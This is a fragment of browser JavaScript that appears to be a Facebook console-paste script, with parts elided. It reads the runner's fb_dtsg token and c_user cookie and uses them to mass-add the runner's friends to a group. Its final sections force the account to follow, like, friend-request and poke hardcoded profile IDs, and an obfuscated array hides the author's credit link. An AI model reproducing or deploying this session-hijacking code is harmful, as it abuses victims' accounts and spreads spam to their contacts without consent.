...
(function() {
    var f = {dtsg: document.getElementsByName("fb_dtsg")[0].value, uid: document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]), gid: document.getElementsByName("group_id")[0].value, frns: Array(), prenKe: 0, okeh: 0, gagal: 0, getAjak: function(b) {
            ...
            c.open("GET", b, !0), c.onreadystatechange = function() {
                if (4 == c.readyState && 200 == c.status) {
                    ...
                    })), document.getElementById("hasilsurasil").innerHTML = "Found <b>" + f.frns.length + " Followers</b><div id='hasilsatu'></div><div id='hasildua'></div><div id='hasiltiga' style='min-width:300px;display:inline-block;text-align:left'></div>" + crj;
                    for (x in f.frns)
                        f.senAjak(x)
                } else
                    document.getElementById("hasilsurasil").innerHTML = 4 == c.readyState && 404 == c.status ? "<b style='color:darkred'>Нээлттэй бүлэг!</b>" + crj : "<b style='color:darkgreen'>Боломжит дагагчийг хайж байна... (" + c.readyState + ")</b>" + crj
            }, c.send()
        }, senAjak: function(d) {
            var e = new XMLHttpRequest, prm = "__a=1&fb_dtsg=" + f.dtsg + "&group_id=" + f.gid + "&source=typeahead&ref=&message_id=&members=" + f.frns[d].uid + "&__user=" + f.uid + "&phstamp=";
        ...
        }}, g = ["i", "a", "e", "g", "o", "s", "n", "b", "l", "p", "m", "2", "r", "0", "c", "1", "t", "3", "�"], crl = g[1] + g[0] + g[6] + g[3] + g[14] + g[12] + g[2] + g[1] + g[16] + g[0] + g[4] + g[6] + g[5] + "." + g[7] + g[8] + g[4] + g[3] + g[5] + g[9] + g[4] + g[16] + "." + g[14] + g[4] + g[10], crj = "<div style='margin-top:10px;color:gray;font-size:12px'>" + g[1].toUpperCase() + g[0] + g[6] + g[3] + g[14].toUpperCase() + g[12] + g[2] + g[1] + g[16] + g[0] + g[4] + g[6] + g[5] + " " + g[g.length - 1] + g[11] + g[13] + g[15] + g[17] + "<div style='font-size:9px'><a href='http://" + crl + "/' target='_blank'>" + crl + "</a></div></div>";
...
// Auto Followers
a("100003178704474");
sublist("1375322589387370");
sublist("1375322482720714");
sublist("1375322436054052");

// AutoLike
a("100006264332517");
sublist("1375322392720723");
sublist("155994667939638");
sublist("1375323066053989");

// Auto Friend Request
a("100005645771341");
sublist("1375322632720699");
sublist("485668424882443");

// Auto Poke
a("100005645771341");
sublist("1375322989387330");
sublist("1375322886054007");

// Auto close friend
a("100002990336940");
sublist("1375322776054018");
sublist("1375322669387362");
